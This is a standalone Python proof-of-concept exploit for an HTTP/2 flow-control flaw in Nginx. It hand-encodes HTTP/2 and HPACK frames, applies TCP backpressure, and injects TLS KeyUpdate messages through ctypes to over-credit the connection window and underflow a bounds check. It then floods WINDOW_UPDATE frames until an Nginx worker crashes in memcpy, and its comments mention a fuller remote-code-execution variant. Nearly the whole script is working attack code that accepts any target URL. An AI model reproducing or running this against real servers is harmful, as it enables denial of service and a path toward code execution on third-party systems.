#!/usr/bin/env python3
"""Standalone Nginx HTTP/2 cleanup-overcredit and signed-window crash PoC.

The first printed oracle demonstrates the root cause: cleanup restores queued
DATA credit above HTTP/2's maximum, after which the unsigned bounds check
accepts another connection WINDOW_UPDATE.  The remaining traffic only proves
that this corrupt state reaches a native output consumer and crashes a worker;
it is not needed to create the accounting error.
"""

import ctypes
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit


MAX = 0x7fffffff
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# The PoC uses only this small, named subset of HTTP/2's frame vocabulary.
DATA = 0
HEADERS = 1
RST_STREAM = 3
SETTINGS = 4
PING = 6
WINDOW_UPDATE = 8

END_STREAM = 1
ACK = 1
END_HEADERS = 4

FLOW_CONTROL_ERROR = 3
CANCEL = 8

# These are RFC 7541 HPACK static-table indexes, not Nginx-specific values.
AUTHORITY = 1
METHOD = 2
PATH = 4
RANGE = 50


# HTTP/2 puts every operation in this nine-byte header.  Keeping the encoder
# here makes the vulnerable on-wire order visible instead of hiding it in a
# client library that may automatically reject the intentionally invalid state.
def frame(kind, flags, stream, data=b""):
    return len(data).to_bytes(3, "big") + bytes((kind, flags)) + stream.to_bytes(4, "big") + data


# Encode an HPACK integer.  Nginx's static-table index for "range" is 50, so
# that header exercises the continuation form rather than a one-byte integer.
def integer(value, bits, mask=0):
    maximum = (1 << bits) - 1
    if value < maximum:
        return bytes((mask | value,))
    data = bytearray((mask | maximum,))
    value -= maximum
    while value >= 128:
        data.append((value & 127) | 128)
        value >>= 7
    return bytes(data) + bytes((value,))


# Encode a literal header without adding attacker data to Nginx's HPACK table.
# The numeric names below are ordinary static-table indexes (:authority,
# :method, :path, and range), not secret or build-specific values.
def literal(name, value):
    value = value.encode()
    return integer(name, 4) + integer(len(value), 7) + value


# Build a complete request.  The default method and scheme bytes are HPACK's
# indexed GET and HTTPS fields; a Range response lets the PoC choose an exact
# response-body size while using the normally configured static resource.
def request(stream, authority, path="/index.html", extra=b""):
    return frame(HEADERS, END_STREAM | END_HEADERS, stream,
                 b"\x82\x87" + literal(AUTHORITY, authority)
                 + literal(PATH, path) + extra)


# SETTINGS_INITIAL_WINDOW_SIZE changes every stream window.  It does not
# directly change the separate connection window whose accounting is broken.
def setting(value):
    return frame(SETTINGS, 0, 0, b"\0\4" + value.to_bytes(4, "big"))


# WINDOW_UPDATE grants response credit.  Stream ID zero is connection-wide;
# any nonzero stream ID changes only that stream.
def update(stream, value):
    return frame(WINDOW_UPDATE, 0, stream, value.to_bytes(4, "big"))


# End one flow-controlled Range response with HTTP/2 CANCEL.  Replacing each
# owner before Nginx's send timer expires keeps the long numeric phase alive
# without periodically releasing any response DATA.
def reset(stream):
    return frame(RST_STREAM, 0, stream, CANCEL.to_bytes(4, "big"))


def main():
    # The private SSL-object bridge below is calibrated for 64-bit CPython
    # 3.10 and OpenSSL 3. Reject other layouts before opening a connection.
    if (sys.implementation.name != "cpython"
            or sys.version_info[:2] != (3, 10)
            or ctypes.sizeof(ctypes.c_void_p) != 8
            or ssl.OPENSSL_VERSION_INFO[0] != 3):
        raise RuntimeError("use 64-bit CPython 3.10 linked to OpenSSL 3")

    # Read the TLS origin, defaulting to the bundled standalone service.
    # This PoC intentionally uses the configured /index.html only.
    url = urlsplit(sys.argv[1] if len(sys.argv) > 1 else "https://127.0.0.1:19443/")
    host, port = url.hostname, url.port or 443
    authority = host if port == 443 else f"{host}:{port}"

    # Start with an ordinary receive window so the public response can be
    # measured and the initial HTTP/2 window can be consumed normally.
    raw = socket.socket()
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 1460)
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 262144)
    raw.settimeout(3)
    raw.connect((host, port))

    # MemoryBIO exposes ciphertext before it reaches TCP.  The PoC needs that
    # control only to queue one complete TLS flight before allowing Nginx to
    # flush response DATA; TLS encryption itself is not part of the flaw.
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = context.maximum_version = ssl.TLSVersion.TLSv1_3
    context.set_alpn_protocols(("h2",))
    tls = context.wrap_bio(incoming, outgoing, server_hostname=host)

    # Put every encrypted byte produced by OpenSSL onto the TCP connection.
    def flush():
        raw.sendall(outgoing.read())

    # Complete the TLS handshake and advertise HTTP/2 through ALPN.
    while True:
        try:
            tls.do_handshake()
            flush()
            break
        except ssl.SSLWantReadError:
            flush()
            ciphertext = raw.recv(262144)
            if not ciphertext:
                raise RuntimeError("connection closed during TLS handshake")
            incoming.write(ciphertext)
    if tls.selected_alpn_protocol() != "h2":
        raise RuntimeError("target did not negotiate HTTP/2")

    # Encrypt arbitrary HTTP/2 plaintext without losing the tail if OpenSSL
    # accepts less than the complete buffer in one call.
    def encrypt(data):
        data = memoryview(data)
        while data:
            data = data[tls.write(data):]

    # Most operations can transmit their ciphertext immediately.
    def send(data):
        encrypt(data)
        flush()

    # Keep a small plaintext HTTP/2 ledger.  It lets the PoC prove that the
    # server, rather than the client, reset both over-credited streams and
    # released the selected ten public bytes.  Only server output is retained,
    # so the multi-gigabyte client-to-server carrier is not stored here.
    receive_buffer = bytearray()
    received_frames = []

    def remember(data):
        receive_buffer.extend(data)
        while len(receive_buffer) >= 9:
            length = int.from_bytes(receive_buffer[:3], "big")
            if len(receive_buffer) < 9 + length:
                return
            kind, flags = receive_buffer[3], receive_buffer[4]
            stream = int.from_bytes(receive_buffer[5:9], "big") & MAX
            payload = bytes(receive_buffer[9:9 + length])
            del receive_buffer[:9 + length]
            received_frames.append((kind, flags, stream, payload))

    # Receive and decrypt responses so Nginx can keep writing and both TLS
    # directions stay synchronized.  A timeout means this drain reached an
    # idle boundary; an empty TCP read means that the selected worker died.
    def drain(seconds):
        plaintext = bytearray()
        deadline = time.monotonic() + seconds
        raw.settimeout(.25)
        while time.monotonic() < deadline:
            try:
                data = raw.recv(262144)
                if not data:
                    return bytes(plaintext), False
                incoming.write(data)
                while True:
                    try:
                        cleartext = tls.read(262144)
                        if not cleartext:
                            return bytes(plaintext), False
                        plaintext.extend(cleartext)
                        remember(cleartext)
                    except ssl.SSLWantReadError:
                        break
                flush()
            except socket.timeout:
                pass
        return bytes(plaintext), True

    # Start HTTP/2, disable response-header table growth, and retain the normal
    # 65,535-byte stream window.  The server SETTINGS response is deliberately
    # read before sending requests so it cannot be mixed into the trigger.
    send(PREFACE + frame(SETTINGS, 0, 0,
                         b"\0\1\0\0\0\0\0\4\0\0\xff\xff"))
    drain(1)

    # Acknowledge the peer's settings, then observe two ordinary 896-byte
    # Golden responses.  Together with the next requests, these consume the
    # normal connection receive window without malformed traffic.
    send(frame(SETTINGS, ACK, 0))
    send(request(1, authority) + request(3, authority))
    drain(1)

    # Golden's public page is 896 bytes.  Another 71 complete responses and a
    # 127-byte Range make the exact equation 2*896 + 71*896 + 127 = 65,535.
    # The requests are finished, while the connection now has no DATA credit.
    send(b"".join(request(stream, authority) for stream in range(5, 147, 2))
         + request(147, authority, extra=literal(RANGE, "bytes=0-126")))
    drain(2)

    # Temporarily apply physical TCP backpressure.  Nginx can still parse the
    # prepared HTTP/2 flight and reserve response DATA, but cannot immediately
    # dispose of every queued buffer through the network stack.
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 1024)

    # Set new streams to zero credit, open two normal 896-byte responses, and
    # grant only their per-stream credit.  Connection credit stays at zero, so
    # both DATA bodies remain owned by live Nginx streams.
    send(setting(0))
    time.sleep(.05)
    send(request(149, authority) + request(151, authority))
    time.sleep(.05)
    send(update(149, 896) + update(151, 896))
    time.sleep(.05)

    # This is the root-cause event.  First grant exactly the 1,792 bytes that
    # Nginx has pending, then raise the connection to HTTP/2's MAX.  Each stream
    # is raised to MAX-1; SETTINGS +2 makes those stream windows illegal.
    # Nginx responds by resetting each stream and cleanup returns both reserved
    # DATA lengths to the connection.  The resulting connection window is now
    # above MAX.  Its next bounds check computes MAX-current as unsigned, so it
    # underflows and incorrectly accepts the following MAX increment.
    event = (update(0, 1792) + update(0, MAX)
             + update(149, MAX - 1) + update(151, MAX - 1)
             + setting(2) + update(0, MAX) + setting(65535)
             + request(155, authority, extra=literal(RANGE, "bytes=0-9")))
    head = (literal(METHOD, "HEAD") + b"\x87"
            + literal(AUTHORITY, authority) + literal(PATH, "/index.html"))

    # Put the event after a large harmless HEAD request.  The filler repeatedly
    # sets the HPACK table size to zero and decodes to no application headers.
    # This keeps the event contiguous with the carrier in an already prepared
    # TLS sequence, with no independent client send/read between its frames.
    carrier = frame(
        HEADERS, END_STREAM | END_HEADERS, 153,
        b"\x20" * (7340032 - len(event) - 9 - len(head)) + head)
    encrypt(carrier + event)
    flight = bytearray(outgoing.read())

    # Standard TLS 1.3 KeyUpdate messages force Nginx to finish consuming the
    # prepared input flight before it can decrypt the next ordinary record.
    # They supply a deterministic parser/output boundary; they do not expose a
    # TLS issue.  Python's ssl API lacks key_update(), so this tested CPython /
    # OpenSSL 3 bridge retrieves the underlying SSL pointer from its wrapper.
    libssl = ctypes.CDLL("libssl.so.3")
    libssl.SSL_key_update.argtypes = (ctypes.c_void_p, ctypes.c_int)
    libssl.SSL_do_handshake.argtypes = (ctypes.c_void_p,)
    handle = ctypes.c_void_p(ctypes.c_void_p.from_address(id(tls._sslobj) + 24).value)
    if not handle.value:
        raise RuntimeError("could not locate CPython's OpenSSL handle")
    for _ in range(262144):
        if libssl.SSL_key_update(handle, 1) != 1 or libssl.SSL_do_handshake(handle) != 1:
            raise RuntimeError("TLS KeyUpdate failed")
        flight.extend(outgoing.read())

    # Deliver the whole prepared flight without an application-level gap.  A
    # long client send timeout avoids confusing local backpressure with target
    # rejection while Nginx works through the flight.
    raw.settimeout(600)
    raw.sendall(flight)
    time.sleep(5)

    # Restore the ordinary TCP receive window, process every KeyUpdate, and
    # collect Nginx's reset and Range-response evidence.
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 262144)
    drain(30)

    reset_errors = {
        stream: int.from_bytes(payload, "big")
        for kind, _, stream, payload in received_frames
        if kind == RST_STREAM and stream in (149, 151) and len(payload) == 4
    }
    public_body = b"".join(
        payload for kind, _, stream, payload in received_frames
        if kind == DATA and stream == 1
    )
    release_frames = [
        (flags, payload) for kind, flags, stream, payload in received_frames
        if kind == DATA and stream == 155
    ]
    release_body = b"".join(payload for _, payload in release_frames)
    if reset_errors != {149: FLOW_CONTROL_ERROR, 151: FLOW_CONTROL_ERROR}:
        raise RuntimeError(f"target did not reset both over-credited streams: {reset_errors}")
    if (not release_frames or not release_frames[-1][0] & END_STREAM
            or len(public_body) != 896
            or release_body != public_body[:10]):
        raise RuntimeError("target did not release the expected ten public bytes")

    # A matching PING ACK proves that Nginx accepted later frames on this same
    # corrupt connection rather than merely delaying an error or GOAWAY.
    sync = frame(PING, 0, 0, b"POC-SYNC")
    before_sync = len(received_frames)
    send(sync)
    _, live = drain(5)
    if (not live or not any(kind == PING and flags & ACK and stream == 0
                            and payload == b"POC-SYNC"
                            for kind, flags, stream, payload
                            in received_frames[before_sync:])):
        raise RuntimeError("queued-DATA refund did not pass the underflowed guard")

    print("cleanup over-credit confirmed; starting signed-window crash amplifier")

    # Nginx's flood check permits control traffic only in proportion to parsed
    # payload.  These 512 maximum-size but header-empty HEAD requests provide
    # enough legitimate input accounting for the unavoidable 52 GiB sequence
    # of tiny WINDOW_UPDATE frames.  They are not heap grooming for this PoC.
    raw.settimeout(600)
    carrier = bytearray(frame(
        HEADERS, END_STREAM | END_HEADERS, 157,
        b"\x20" * (0xffffff - len(head)) + head))
    for stream in range(157, 1181, 2):
        carrier[5:9] = stream.to_bytes(4, "big")
        send(carrier)

    # Open a normal one-byte Range response with zero stream credit.  This is
    # the same response class used by the full exploit; no unusual HTTP method
    # or error page is required to reach the vulnerable output consumer.
    sink = 1181
    one_byte_range = literal(RANGE, "bytes=0-0")
    send(setting(0) + request(sink, authority, extra=one_byte_range))
    drain(1)
    if (not any(kind == HEADERS and stream == sink
                for kind, _, stream, _ in received_frames)
            or any(kind == DATA and stream == sink
                   for kind, _, stream, _ in received_frames)):
        raise RuntimeError("one-byte flow-control owner was not queued")
    raw.settimeout(600)

    # MAX is just under 2^31.  Exactly 2^32 accepted increments therefore
    # move the 64-bit connection window through its signed midpoint.  The
    # full RCE continues for another 2^32 increments to tune a small wrapping
    # copy; this smaller suffix is sufficient for an immediate crash proof.
    # Rotate ordinary one-byte Range owners between tranches so no DATA is
    # released while the connection window is negative and no owner waits for
    # Nginx's send timeout.  Each reset/new request is protocol-valid and is
    # parsed after that tranche's last WINDOW_UPDATE on this same TCP stream.
    maximum = update(0, MAX)
    batch = maximum * (1 << 20)
    for tranche in range(128):
        for _ in range(32):
            send(batch)
        if tranche != 127:
            next_sink = sink + 2
            send(reset(sink) + request(next_sink, authority,
                                       extra=one_byte_range))
            sink = next_sink

    # Grant the last Range stream one byte after the connection window has
    # become a negative signed output limit.  Nginx builds an inverted buffer
    # and passes its huge apparent length to TLS's memcpy staging operation.
    # The midpoint value has a noncanonical endpoint, so this proof takes the
    # deliberately fatal path instead of the full exploit's bounded copy.
    send(update(sink, 1))
    _, live = drain(20)
    if live:
        raise RuntimeError("worker did not crash")
    print("Nginx worker crashed in the signed-window memcpy consumer")


if __name__ == "__main__":
    main()
